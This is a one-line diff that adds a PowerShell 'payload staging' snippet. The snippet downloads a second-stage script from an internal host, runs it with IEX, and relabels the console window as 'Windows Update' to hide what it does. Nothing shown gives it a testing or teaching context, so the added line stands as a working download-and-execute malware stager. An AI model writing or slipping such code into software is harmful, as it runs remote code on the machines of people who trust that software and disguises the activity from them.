@@ -1,0 +1,1 @@
+<# Payload staging #> $Stage1Url = 'http://internal.corp:80/stage2.ps1'; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($Stage1Url); IEX $DownloadedScript; $Host.UI.RawUI.WindowTitle = "Windows Update"
